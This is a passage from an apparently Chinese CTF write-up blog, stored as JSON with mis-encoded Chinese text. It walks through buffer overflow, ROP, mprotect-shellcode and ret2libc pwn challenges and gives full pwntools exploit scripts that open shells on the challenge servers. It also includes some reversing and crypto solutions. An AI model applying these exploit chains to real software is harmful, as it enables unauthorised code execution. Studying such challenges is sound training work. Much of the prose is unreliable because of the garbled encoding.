å­—ç¬¦ä¸²çš„å¼€å¤´éƒ¨åˆ†è§£ææˆä¸€ä¸ªåè¿›åˆ¶çš„é•¿æ•´å‹æ•°å€¼ï¼Œ    puts(flag);    fseek(stdin, 0, SEEK_END);    exit(0);  &#125;  entry_number--;  strncpy(output, data[entry_number], input_lengths[entry_number]);  puts(output);&#125;\n\næ‰€ä»¥é‡ç‚¹å°±æ˜¯((entry_number = strtol(entry, NULL, 10)) == 0)çš„è¾“å‡ºç»“æœä¸º0\n\n\nflag:picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F}\nbuffer overflow 0é¢˜ç›®ä¿¡æ¯\nè®©æˆ‘ä»¬ä»ç®€å•çš„å¼€å§‹ï¼Œä½ èƒ½æº¢å‡ºæ­£ç¡®çš„ç¼“å†²åŒºå—ï¼Ÿè¯¥ç¨‹åºå¯åœ¨æ­¤å¤„è·å¾—ã€‚æ‚¨å¯ä»¥æŸ¥çœ‹æºä»£ç  è¿™é‡Œ ã€‚\nè§£å¯†\nä¸»å‡½æ•°\n\n signal(11, sigsegv_handler)å½“ç¨‹åºå‘ç”Ÿæ®µé”™è¯¯ï¼ˆå³æ”¶åˆ°ä¿¡å· 11ï¼Œä¹Ÿå°±æ˜¯ SIGSEGVï¼‰æ—¶ï¼Œä¸æ‰§è¡Œé»˜è®¤æ“ä½œï¼ˆå´©æºƒï¼‰ï¼Œè€Œæ˜¯è·³è½¬åˆ°ä½ å®šä¹‰çš„ sigsegv_handler å‡½æ•°è¿›è¡Œå¤„ç†ã€‚ \n\nå½“ä½ çš„ç¨‹åºè¯•å›¾è®¿é—®éæ³•å†…å­˜åœ°å€ï¼ˆå¦‚æœªåˆ†é…çš„å†…å­˜ã€åªè¯»å†…å­˜ã€å·²é‡Šæ”¾çš„å†…å­˜ç­‰ï¼‰æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šå‘é€è¿™ä¸ªä¿¡å·ç»™ç¨‹åºã€‚\né»˜è®¤æƒ…å†µä¸‹ï¼Œæ”¶åˆ° SIGSEGV ä¼šå¯¼è‡´ç¨‹åºå´©æºƒï¼ˆæ®µé”™è¯¯ï¼‰ã€‚\n\nç¤ºä¾‹è§¦å‘åŸå› ï¼š\n\nè§£å¼•ç”¨ç©ºæŒ‡é’ˆï¼š*NULL\nå†™å…¥å¸¸é‡å­—ç¬¦ä¸²ï¼šstrcpy(&quot;hello&quot;, &quot;world&quot;)\nè¶Šç•Œè®¿é—®æ ˆæ•°ç»„ã€å †æ•°ç»„\nä½¿ç”¨æœªåˆå§‹åŒ–çš„æŒ‡é’ˆ\n\nè¿™ä¸ªå¯¹flag.txtæ–‡ä»¶çš„æ“ä½œ ç›¸å½“äºbin&#x2F;shåé—¨å‡½æ•°\nå®ƒåŒ…å«äº†è¯»å–flag,å¹¶æŠŠflagè¾“å‡ºåœ¨ç»ˆç«¯\nè€Œåœ¨ Linux&#x2F;Unix ç³»ç»Ÿä¸­ï¼Œ/bin/sh æ˜¯ä¸€ä¸ªæŒ‡å‘ç³»ç»Ÿé»˜è®¤ shellï¼ˆå¦‚ Bashï¼‰çš„å¯æ‰§è¡Œæ–‡ä»¶\nsigsegv_handlerå‡½æ•°\n\nè¯¥å‡½æ•°ä¼šè¾“å‡ºflag\næ‰€ä»¥åªéœ€è¦å®ç°å°±å¯ä»¥è¾“å‡ºflag\n\nè„šæœ¬from pwn import *p = remote(&quot;saturn.picoctf.net&quot;, 62318)p.sendline(b&#x27;a&#x27;*20)p.interactive()\n\n\n\n\n\n\n\n\n\n\n\nbuffer overflow 1é¢˜ç›®æè¿°\næ§åˆ¶é€€è´§åœ°å€ç°åœ¨æˆ‘ä»¬å¼€å§‹çƒ¹é¥ªäº†ï¼æ‚¨å¯ä»¥æº¢å‡ºç¼“å†²åŒºå¹¶è¿”å›åˆ°ç¨‹åºä¸­çš„ flag å‡½æ•°ã€‚ä½ å¯ä»¥åœ¨è¿™é‡ŒæŸ¥çœ‹æºä»£ç ã€‚\nè§£å¯†\n\n\nvar_4 æ˜¯ä»€ä¹ˆï¼Ÿ\n\nåœ¨æ±‡ç¼–æˆ–åç¼–è¯‘å·¥å…·ï¼ˆå¦‚ IDA Proï¼‰ä¸­ï¼Œvar_4 æ˜¯ä¸€ä¸ªç”±å·¥å…·è‡ªåŠ¨ç”Ÿæˆçš„åç§°ï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ªä½äºæ ˆä¸Šçš„å±€éƒ¨å˜é‡ã€‚å®ƒé€šå¸¸æ˜¯åŸå§‹Cä»£ç ä¸­æ²¡æœ‰æ˜ç¡®å‘½åçš„å˜é‡ï¼Œæˆ–è€…æ˜¯ç¼–è¯‘å™¨ä¸ºäº†ä¼˜åŒ–æˆ–å†…éƒ¨ä½¿ç”¨è€Œåˆ›å»ºçš„æ ˆç©ºé—´ã€‚\nä»å›¾ç‰‡ä¸­å¯ä»¥çœ‹åˆ°ï¼Œvar_4 ä½äº s æ•°ç»„çš„ä¸‹æ–¹ï¼ˆåœ¨æ ˆå¸§ä¸­ï¼Œå±€éƒ¨å˜é‡é€šå¸¸ä» EBP å¾€ä¸‹åˆ†é…ï¼‰ã€‚\n\nvar_4 æœ‰å¤šå¤§ï¼Ÿ\n\nå›¾ç‰‡ä¸­ var_4 å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤æ˜¯ dd ?ã€‚\ndd åœ¨æ±‡ç¼–ä¸­æ˜¯ â€œDefine Doublewordâ€ çš„ç¼©å†™ã€‚åœ¨ 32 ä½ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ª Doubleword æ˜¯ 4 å­—èŠ‚ã€‚\nå› æ­¤ï¼Œvar_4 çš„å¤§å°æ˜¯ 4 å­—èŠ‚ã€‚\n\næ‰€ä»¥åƒåœ¾å­—èŠ‚è¦å¡«å……36+4+4&#x3D;44ä¸ªå­—èŠ‚\n\nwinæ˜¯åé—¨å‡½æ•°\nå¡«å……å®ƒçš„åœ°å€\nè„šæœ¬from pwn import *p = remote(&quot;saturn.picoctf.net&quot;, 59895)p.sendline(b&#x27;a&#x27;*44+p32(0x080491F6))p.interactive()\n\n\n\n\n\n\n\nbuffer overflow 2é¢˜ç›®æè¿°\næ§åˆ¶è¿”å›åœ°å€å’Œå‚æ•°è¿™ä¸€æ¬¡ï¼Œæ‚¨éœ€è¦æ§åˆ¶æ‚¨è¿”å›çš„å‡½æ•°çš„å‚æ•°ï¼æ‚¨å¯ä»¥ä»æ­¤ç¨‹åºä¸­è·å–æ ‡å¿—å—ï¼Ÿä½ å¯ä»¥åœ¨è¿™é‡ŒæŸ¥çœ‹æºä»£ç \nè§£å¯†\n\nsè·ç¦»è¿”å›åœ°å€æ˜¯6C+4ä¸ªå­—èŠ‚\n\nè¦ä¼ å‚ï¼Œ32ä½æ˜¯å‚æ•°ä»å³åˆ°å·¦ä¾æ¬¡å‹å…¥æ ˆä¸­\nwinçš„åœ°å€\n\ngdbåŠ¨è°ƒæŸ¥çœ‹python wp.py\n\næ‰§è¡Œçš„å‡½æ•°åˆ—è¡¨\nè„šæœ¬from pwn import *# æœ¬åœ°# ex = process(&#x27;./vuln&#x27;)# è¿œç¨‹p = remote(&#x27;saturn.picoctf.net&#x27;, 62974)payload = b&#x27;a&#x27;*112+p32(0x08049296)+p32(0)+p32(0xCAFEF00D)+p32(0xF00DF00D)p.sendline(payload)# p.interprint(p.recvall())\n\n\n\n\n\n\n\n\n\n\n\nx-sixty-whaté¢˜ç›®æè¿°\næº¢å‡º x64 ä»£ç åœ¨æ­¤ä¹‹å‰çš„å¤§å¤šæ•°é—®é¢˜æ˜¯ 32 ä½ x86ã€‚ç°åœ¨æˆ‘ä»¬è€ƒè™‘ 64 ä½ x86ï¼Œå®ƒ åªæ˜¯æœ‰ç‚¹ä¸åŒï¼ä½¿ç¼“å†²åŒºæº¢å‡ºï¼Œå¹¶å°†è¿”å›åœ°å€æ›´æ”¹ä¸º flag å‡½æ•°ã€‚ ä¸‹è½½æºä»£ç  ã€‚\nè§£å¯†\nè¿™ä¸€é¢˜æˆ‘é”™äº†å¾ˆä¹…ï¼Œæœ€åå‘ç°è€ƒäº†å †æ ˆå¹³è¡¡:crying_cat_face:\nä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸€äº›gdbè°ƒè¯•è·å–ä¿¡æ¯çš„æ–¹æ³•\n\n\n\ngdbè°ƒè¯•è·å¾—ç›¸å…³ä¿¡æ¯\nreadelf -s vulnæ˜¾ç¤ºæ‰€æœ‰å‡½æ•°çš„ä¿¡æ¯ï¼ˆåœ¨gdbè°ƒè¯•ä¹‹å‰ï¼‰\n\np flagï¼šæ˜¾ç¤ºå‡½æ•°flagçš„ä¿¡æ¯\n\nï¼ˆgdbï¼‰disassemble vulnï¼šæ‰¾è¦å¡«å……çš„å­—èŠ‚æ•°ï¼ˆï¼‰\n64ä½æ—¶æ˜¯0x40+8\n32ä½æ—¶æ˜¯0x40+4\n\nå †æ ˆå¹³è¡¡åŒä¸€ä¸ªç¨‹åºçš„æ¯ä¸€ä¸ª call æŒ‡ä»¤æ‰§è¡Œæ—¶ï¼Œrspï¼ˆæ ˆæŒ‡é’ˆï¼‰çš„ç»å¯¹å€¼ä¸ä¸€å®šç›¸åŒï¼Œä½†å…¶å¯¹é½çŠ¶æ€æ˜¯ä¿æŒä¸€è‡´çš„ã€‚\nå½“ vuln å‡½æ•°é€šè¿‡ ret æŒ‡ä»¤è·³è½¬åˆ° flag å‡½æ•°æ—¶ï¼Œflag å‡½æ•°çš„å…¥å£å¤„ rsp (æ ˆæŒ‡é’ˆ) å¯èƒ½æ»¡è¶³ rsp % 16 == 0 (å³ 16 å­—èŠ‚å¯¹é½)ã€‚ä½†æ˜¯ï¼Œflag å‡½æ•°çš„åºè¨€ (prologue) é€šå¸¸ä¼š push rbp (å°† rbp å‹æ ˆ)ï¼Œè¿™ä¼šä½¿ rsp å‡å» 8 å­—èŠ‚ï¼Œå¯¼è‡´ rsp % 16 == 8 (8 å­—èŠ‚ä¸å¯¹é½)ã€‚\né—®é¢˜å°±å‡ºåœ¨è¿™é‡Œï¼šåœ¨æ‰§è¡Œä»»ä½• call æŒ‡ä»¤ä¹‹å‰ï¼Œrsp å¿…é¡»æ˜¯ 16 å­—èŠ‚å¯¹é½çš„ã€‚\næ‰€ä»¥è¯¥å‡½æ•°åˆ°flagä¹‹å‰è¦å…ˆåˆ°retå°å·¥å…·\nä½¿ç”¨ ROPgadget (æ¨è)ï¼š åœ¨ç»ˆç«¯ä¸­è¿è¡Œï¼ˆç¡®ä¿ä½ çš„ vuln å¯æ‰§è¡Œæ–‡ä»¶åœ¨å½“å‰ç›®å½•ï¼‰ï¼š\nBash\nROPgadget --binary ./vuln --only &quot;ret&quot;\n\nå®ƒä¼šåˆ—å‡ºæ‰€æœ‰ç‹¬ç«‹çš„ ret æŒ‡ä»¤åœ°å€ã€‚é€šå¸¸ä½ å¯ä»¥é€‰æ‹©å…¶ä¸­ä¸€ä¸ªåœ°å€æœ€å°çš„ï¼Œæˆ–è€…ä½ è§‰å¾—â€œç‹¬ç«‹â€çš„åœ°å€ï¼ˆä¾‹å¦‚ï¼Œä¸åœ¨ä»»ä½•é‡è¦å‡½æ•°çš„ä¸­é—´ï¼‰ã€‚0x0040101a æ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„å¤‡é€‰ã€‚\nåœ¨ GDB&#x2F;pwndbg ä¸­æ‰‹åŠ¨æŸ¥æ‰¾ï¼š å¯åŠ¨ GDB è°ƒè¯• ./vulnï¼Œç„¶åä½¿ç”¨ search-pattern å‘½ä»¤æŸ¥æ‰¾ ret æŒ‡ä»¤çš„æœºå™¨ç  \\xc3ï¼š\nCode snippet\nsearch-pattern &#x27;\\xc3&#x27;\n\nä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ disassemble &lt;section_start_address&gt;, &lt;section_end_address&gt; æ¥åæ±‡ç¼–æ•´ä¸ªä»£ç æ®µï¼Œç„¶åæ‰‹åŠ¨æŸ¥æ‰¾ retã€‚\nç›´æ¥çœ‹å‡ºå †æ ˆä¸å¹³è¡¡\nè¯¥å‡½æ•°æ˜¯flagè¢«è°ƒç”¨å‡½æ•°è¾“å‡ºflagï¼Œæ‰€ä»¥åœ¨flagå‡½æ•°ä¸­çš„ç¬¬ä¸€ä¸ªcallçš„åœ°æ–¹ä¸‹æ–­ç‚¹\npython ä½ çš„è„šæœ¬æ–‡ä»¶å.pyï¼šè¿è¡Œè„šæœ¬\ninfo registers rspï¼šæŸ¥çœ‹rspçš„å¯„å­˜å™¨ä¿¡æ¯\n\nçœ‹æœ€åä¸¤ä½  \n0x48å¯ä»¥æ•´é™¤16ï¼Œæ‰€ä»¥ç°åœ¨å †æ ˆå¹³è¡¡äº†\nè„šæœ¬from pwn import *# p = process(&#x27;./vuln&#x27;)# gdb.attach(p, gdbscript=&#x27;b *0x08049370\\ncontinue&#x27;)p = remote(&quot;saturn.picoctf.net&quot;, 50442)# ä¹‹å‰æ‰¾åˆ°çš„ flag å‡½æ•°åœ°å€flag_address = 0x00401236 # åœ¨ä½ çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°ä¸€ä¸ª ret å°å·¥å…·çš„åœ°å€# å‡è®¾ä½ æ‰¾åˆ°çš„æ˜¯ 0x0040101aï¼Œè¯·æ›¿æ¢ä¸ºä½ åœ¨ GDB/ROPgadget ä¸­æ‰¾åˆ°çš„å®é™…åœ°å€ret_gadget_address = 0x0040101a # æ„å»º payloadï¼šå¡«å…… + ret_gadget_address + flag_addresspayload = b&#x27;A&#x27; * (0x40 + 8) + p64(ret_gadget_address) + p64(flag_address)p.sendline(payload)print(p.recvall())\n\n","categories":["WP"],"tags":["WP"]},{"title":"pwn49","url":"/2025/07/26/pwn49/","content":"é¢˜ç›®\n\n\nçœ‹å‡ºæ˜¯é™æ€ç¼–è¯‘ï¼Œè€ƒè™‘ç”¨mprotectæ¥ä¿®æ”¹å®ƒçš„æƒé™\n\nctrl+sæŸ¥çœ‹bssæ®µï¼Œæ‰¾è¦ä¿®æ”¹çš„èŒƒå›´\n\nå› ä¸ºmprotectçš„åœ°å€é€‰æ‹©çš„é™åˆ¶æ¡ä»¶\næˆ‘ä»¬æŠŠé¡µé¢è¾¹ç•Œå®šä¸º0x80DA000\næ¥ç€å°±å¯ä»¥æ„é€ payloadäº†\nå…ˆè°ƒç”¨mprotectå‡½æ•°ä¿®æ”¹æƒé™ï¼Œå†ç”¨readå‡½æ•°æŠŠåé—¨å‡½æ•°è¯»å…¥è¿™ä¸ªä½ç½®\nä¹‹åæ§åˆ¶è¿”å›åœ°å€è®©ç¨‹åºå›åˆ°è¿™ä¸ªåœ°æ–¹æ‰§è¡Œåé—¨å‡½æ•°\nè„šæœ¬from pwn import *#p=process(&quot;./pwn49&quot;)context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#gdb.attach(p,&quot;b*0x0000000000400737&quot;)p=remote( &quot;pwn.challenge.ctf.show&quot;,28242)elf=ELF(&quot;./pwn49&quot;)edx_ecx_ebx=0x08056194mprotect=0x0806cdd0start=0x80DA000read=elf.sym[&quot;read&quot;]payload=b&#x27;a&#x27;*(0x12+4)+p32(mprotect)payload += p32(edx_ecx_ebx) + p32(start) + p32(1000) + p32(7)payload+=p32(read)+p32(edx_ecx_ebx)+p32(0)+p32(start)+p32(1000)+p32(start)p.sendline(payload)payload=asm(shellcraft.sh())p.sendline(payload)p.interactive()\n\nï¼ˆæ‰¾pop_retæ—¶åªéœ€è¦æ§åˆ¶æ˜¯popäº†é‚£ä¸‰ä¸ªå¯„å­˜å™¨å°±å¯ä»¥ï¼‰\nmprotect\nmprotect ç³»ç»Ÿè°ƒç”¨æœ‰ä¸¥æ ¼çš„é¡µé¢å¯¹é½è¦æ±‚ï¼š\n\nèµ·å§‹åœ°å€å¿…é¡»æ˜¯é¡µé¢è¾¹ç•Œï¼ˆ4KBä¸ªå­—èŠ‚çš„å€æ•°ï¼‰ï¼ˆ4KB&#x3D;1000å­—èŠ‚)\né•¿åº¦ä¼šè¢«å‘ä¸Šèˆå…¥åˆ°é¡µé¢è¾¹ç•Œ\nåŒºé—´é•¿åº¦ len å¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€\n\nå‡è®¾ä½ çš„ BSS æ®µå¼€å§‹äº 0x80DB320,lené•¿åº¦ä¸º1000ï¼š\nå†…å­˜å¸ƒå±€ï¼š\n0x80DA000 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â† é¡µé¢è¾¹ç•Œï¼ˆ4KBå¯¹é½ï¼‰â€‹          â”‚     é¡µé¢1        â”‚â€‹          â”‚                 â”‚0x80DB320 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â† BSSæ®µå¼€å§‹â€‹          â”‚     BSSæ®µ       â”‚â€‹          â”‚                 â”‚0x80DBFFF â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â† é¡µé¢1ç»“æŸ0x80DC000 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â† ä¸‹ä¸€ä¸ªé¡µé¢è¾¹ç•Œ\n\n","categories":["exercise_pwn"],"tags":["PWN","mprotect","é™æ€ç¼–è¯‘"]},{"title":"ret2libc-printf","url":"/2025/07/20/ret2libc-printf/","content":"ä¸¥æ ¼ç¬¦åˆprintfçš„æ ¼å¼[HarekazeCTF2019]baby_rop2\n\n\nè€Œä¸”å‡½æ•°ä¸­æ²¡æœ‰systemå‡½æ•°å’Œç›¸åº”å­—ç¬¦ä¸²\nè¦æ³„éœ²libcçš„åœ°å€\n\né€šè¿‡readè¯»å–æ•°æ®ï¼Œç”¨printfæ‰“å°å‡ºæ¥\nprintf å‡½æ•°çš„ GOT åœ°å€ä¸èƒ½ç”¨æ¥æ³„éœ² printf è‡ªå·±çš„åœ°å€ï¼Ÿ\næ˜¯çš„ï¼Œè¿™æ˜¯ä¸ªé¸¡ç”Ÿè›‹è›‹ç”Ÿé¸¡ çš„é—®é¢˜ï¼š\n\nprintf@got ä¿å­˜çš„æ˜¯ printf çš„çœŸå®åœ°å€ï¼ˆlibc ä¸­çš„åœ°å€ï¼‰ã€‚\nä½†ä½ è¦è°ƒç”¨ printf æ‰èƒ½æ‰“å°å®ƒï¼Œè€Œè°ƒç”¨ printf åˆä¾èµ– GOT è¡¨é¡¹çš„åœ°å€ã€‚\nå¦‚æœ GOT è¡¨é¡¹è¿˜æ²¡è§£æï¼ˆå»¶è¿Ÿç»‘å®šï¼‰ï¼Œå®ƒæŒ‡å‘ PLT stubï¼Œä¸æ˜¯çœŸå®åœ°å€ã€‚\nå³ä½¿ GOT è¡¨é¡¹å·²è§£æï¼Œä½ ä¹Ÿæ— æ³•é€šè¿‡ printf(&quot;%s&quot;, printf_got) æ­£ç¡®è¯»å–åœ°å€ã€‚\n\nğŸ§  æ€»ç»“å¯¹æ¯”\n\n\n\n\n\n\n\n\n\nputs(puts_got)\nâœ… å¯è¡Œ\nputsä¼šå°è¯•æ‰“å°ä»puts_gotå¼€å§‹çš„å†…å®¹ï¼Œlibc ä¸­æœ‰å­—ç¬¦ä¸²ï¼Œä¸ä¼šå´©æºƒ\n\n\nprintf(&quot;%s&quot;, printf_got)\nâŒ ä¸å¯è¡Œ\nprintfä¼šå°è¯•ä»printf_gotåœ°å€è¯»å–å­—ç¬¦ä¸²ï¼Œä½†é‚£æ˜¯ä¸ªå‡½æ•°åœ°å€ï¼Œä¸æ˜¯å­—ç¬¦ä¸²\n\n\nprintf(&quot;%p&quot;, printf_got)\nâœ… å¯è¡Œï¼ˆéœ€æ„é€ ï¼‰\nå¯ä»¥æ‰“å°åœ°å€ï¼Œä½†éœ€è¦æ­£ç¡®è®¾ç½®æ ¼å¼å­—ç¬¦ä¸²\n\n\nprintf(&quot;%s&quot;, read_got)\nâœ… å¯è¡Œï¼ˆå¶å°”ï¼‰\nread_gotæŒ‡å‘çš„åœ°å€é™„è¿‘å¯èƒ½æœ‰å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ‰“å°å‡ºæ¥\n\n\nputs(printf_got)\nâœ… å¯è¡Œï¼ˆå¶å°”ï¼‰\nåŒä¸Šï¼Œä½†ä¾èµ– libc ä¸­çš„å­—ç¬¦ä¸²\n\n\nè¦è°ƒç”¨printfå‡½æ•°è¿›è¡Œæ³„éœ²ï¼Œå°±è¦æ ¹æ®å…¶ç‰¹æ€§æ¥ä¼ å‚ï¼Œprintfå‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä¸€ä¸ªå¯å˜å‚æ•°åˆ—è¡¨\n\nRDIã€RSIã€RDXã€RCXã€R8ã€R9å‚æ•°æŒ‰ç…§è¿™ä¸ªé¡ºåºä¼ å…¥å¯„å­˜å™¨ä¸­\næœ‰å•ç‹¬çš„rdi\næ‰€ä»¥rdi&#x3D;0x400733\nä½†æ²¡æœ‰å•ç‹¬å¯¹rsiçš„å¤„ç†\næ‰€ä»¥rsi_r15&#x3D;0x400731ï¼Œå¯¹r15éšä¾¿ä¼ å…¥ä¸€ä¸ªæ•°å°±å¯\nç¬¬ä¸€æ¬¡payloadçš„æ„é€ \npayload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_plt)p.recvuntil(b&quot;name? &quot;)p.sendline(payload)read= u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(hex(read))\n\n\n\nç¬¬äºŒæ¬¡é€šè¿‡è®¡ç®—å‡ºlibcçš„åŸºå€ï¼ŒåŠ ä¸Šåç§»é‡å°±å¾—åˆ°äº†éœ€è¦çš„å‡½æ•°çš„åœ°å€ï¼Œå°±å¯ä¸iè¿›è¡Œæ„é€ äº†\npayload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)\n\n\n\n\n\n\n\nè„šæœ¬\nfrom pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;#p = process(&#x27;./babyrop2&#x27;)p = remote(&quot;node5.buuoj.cn&quot;,25235)elf = ELF(&#x27;./babyrop2&#x27;)pop_rdi = 0x0000000000400733pop_rsi_r15 = 0x0000000000400731 format_str = 0x0000000000400770  ret_addr = 0x0000000000400734printf_plt = elf.plt[&#x27;printf&#x27;]read_got = elf.got[&#x27;read&#x27;]main_plt = 0x400636payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_plt)p.recvuntil(b&quot;name? &quot;)p.sendline(payload)read= u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(hex(read))libc = LibcSearcher(&#x27;read&#x27;, read)libc_base = read - libc.dump(&#x27;read&#x27;)sys_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)p.sendline(payload)p.interactive()\n\n\n\n\n\n\n\nå•ä¸ªå‡½æ•°pwn2_sctf_2016\n\n\n\né¦–å…ˆçœ‹åˆ°é¢˜ç›®è¾“å…¥ä¸€ä¸ªå°äº32çš„æ•°ï¼Œå¹¶æŠŠè¿™ä¸ªæ•°å½“ä½œgetè¾“å…¥çš„æœ€å¤§é™åˆ¶\næ‰€ä»¥å¯ä»¥è¾“å…¥ä¸€ä¸ªè´Ÿæ•°æ¥è§£å†³è¿™ä¸ªé™åˆ¶\nä¹Ÿæ˜¯æ²¡æœ‰systemå‡½æ•°çš„ç›¸å…³å†…å®¹\nè€ƒè™‘æ³„éœ²libcçš„åœ°å€\n:detective:ç”¨printfæ‰“å°ï¼Œå¯ä»¥ç”¨printfçš„gotè¡¨ã€\nå› ä¸ºä½ è°ƒç”¨äº† printf(printf_got)ã€‚\nå¯¹äº printf æ¥è¯´ï¼š\n\nå®ƒçœ‹ä¸åˆ°è¿™æ˜¯ä¸€ä¸ªæ•´æ•°åœ°å€\n\nå®ƒåªæ˜¯æŠŠä½ ç»™çš„æŒ‡é’ˆå½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²æ ¼å¼è§£æ\n\nå¦‚æœä½ ä¼ å…¥çš„è¿™ä¸ªåœ°å€æ˜¯å¯è¯»çš„å†…å­˜ï¼Œå®ƒå°±ä¼šæŒ‰ç…§é‚£å—å†…å­˜çš„å†…å®¹å½“ä½œå­—ç¬¦ä¸²å»è¾“å‡º\næ‰€ä»¥å¦‚æœåªæ˜¯ä¼ ä¸€ä¸ªå‚æ•°ï¼Œprintfå‡½æ•°ä¼šåˆšå¥½æŠŠå®ƒå½“ä½œå­—ç¬¦ä¸²\nåˆšå¥½è§£å†³äº†ä¼ é€’å®ƒæœ¬èº«çš„gotè¡¨åœ°å€ï¼Œå’Œåªæœ‰ä¸€ä¸ªå‚æ•°çš„é—®é¢˜\npayload=b&#x27;a&#x27; * (0x2c+4) + p32(printf_plt) + p32(main) + p32(printf_got)\n\nä¹‹åå°±æ˜¯æ ‡å‡†æµç¨‹\nå°±æ˜¯è®°å¾—è¿”å›åœ°å€æ˜¯mainå‡½æ•°\nè¦å†æ¬¡è¾“å…¥ä¾æ¬¡é‚£ä¸ªè´Ÿæ•°\nè„šæœ¬\nfrom pwn import *from LibcSearcher import *from time import sleepr = remote(&quot;node5.buuoj.cn&quot;,28640)elf = ELF(&#x27;./pwn2_sctf_2016&#x27;)printf_plt = elf.plt[&#x27;printf&#x27;]printf_got = elf.got[&#x27;printf&#x27;]main= elf.sym[&#x27;main&#x27;]r.recvuntil(b&#x27;read?&#x27;)r.sendline(b&#x27;-1&#x27;)r.recvuntil(b&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4)payload += p32(printf_plt) + p32(main) + p32(printf_got)r.sendline(payload)r.recvuntil(&#x27;\\n&#x27;)printf_addr=u32(r.recv(4))#æ¥å—libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)base = printf_addr - libc.dump(&#x27;printf&#x27;)system_addr = base + libc.dump(&#x27;system&#x27;)bin_sh = base + libc.dump(&#x27;str_bin_sh&#x27;)r.recvuntil(b&#x27;How many bytes do you want me to read?&#x27;)r.sendline(b&#x27;-1&#x27;)r.recvuntil(b&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4) + p32(system_addr) + p32(main) + p32(bin_sh)r.sendline(payload)r.interactive()\n\n\n\n","categories":["exercise_pwn"],"tags":["PWN","ret2libc-printf"]},{"title":"å¾¡ç½‘æ¯çº¿ä¸‹2025","url":"/2025/07/14/%E5%BE%A1%E7%BD%91%E6%9D%AF2025%E7%BA%BF%E4%B8%8B/","content":"re_c\n\nFLAG:flag{HNCTFmng1}\nre_python\nå¾—åˆ°\n\n\nè„šæœ¬\nc = [144, 163, 158, 177, 121, 39, 58, 58, 91, 111, 25, 158, 72, 53, 152,      78, 171, 12, 53, 105, 45, 12, 12, 53, 12, 171, 111, 91, 53,      152, 105, 45, 152, 144, 39, 171, 45, 91, 78, 45, 158, 8]flag=&quot;&quot;for i in range(42):    for j in range (128):        if j * 33 % 179 == c[i]:            flag+=chr(j)print(flag)#flag&#123;2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca&#125;\n\nå†æ›¿æ¢ä¸€ä¸‹\n\ncrypto1\næ”¾åˆ°éšæ³¢é€æµé‡Œé¢èƒ½çœ‹åˆ°Rot13è§£ç ä¹‹åæ˜¯æ˜æ˜¾çš„16è¿›åˆ¶ç¼–ç å½¢å¼\n\n\nç»è¿‡16è¿›åˆ¶è½¬å­—ç¬¦åç‰¹å¾å¾ˆæ˜æ˜¾ï¼Œæœ€åBase32-&gt;Base64-&gt;Ascii85æ··åˆè§£ç å¾—åˆ°flagã€‚\nCrypto_10çœ‹åˆ°é¢˜ç›®æè¿°é‡æ’æ—¶åº 62æ˜ŸåºçŒœæµ‹å€’åºå’ŒBase62ã€‚\n\nå€’åºï¼š\n\nBase62è§£ç ï¼š\n\ncryptoè§£å‹è¿™ä¸ªæ–‡ä»¶å¤¹æ‰“å¼€ä¸‹è½½çš„é™„ä»¶ï¼Œæœ‰ä¸€ä¸ªå‹ç¼©åŒ…å’Œä¸€å¼ å›¾ç‰‡ã€‚ç›´æ¥è§£å‹æ–‡ä»¶å¤¹éœ€è¦å¯†ç ï¼Œå›¾ç‰‡ä¹Ÿä¸èƒ½ç›´æ¥æ‰“å¼€ã€‚\n\n\nå›¾ç‰‡ç”¨010æ‰“å¼€å‘ç°æ–‡ä»¶å¤´æ˜¯é”™çš„ä¿®æ”¹ä¸€ä¸‹ï¼Œå¾—åˆ°è§£å‹å¯†ç ã€‚\n\nå‹ç¼©åŒ…è§£å‹å¾—åˆ°flag.jpgç›´æ¥æ”¾éšæ³¢é€æµé‡Œç„¶åbase64è§£ç ã€‚\n\n\nå¾—åˆ°ctf_you_passedåŒ…è£¹flag{}å°±æ˜¯æœ€åçš„flagã€‚\ncrypto encryption2fromÂ secretÂ importÂ init1,init2,init3,FLAGimportÂ hashlibassert(FLAG==&quot;flag&#123;&quot;+hashlib.sha256(init1+init2+init3).hexdigest()+&quot;&#125;&quot;)classlfsr():Â  Â Â 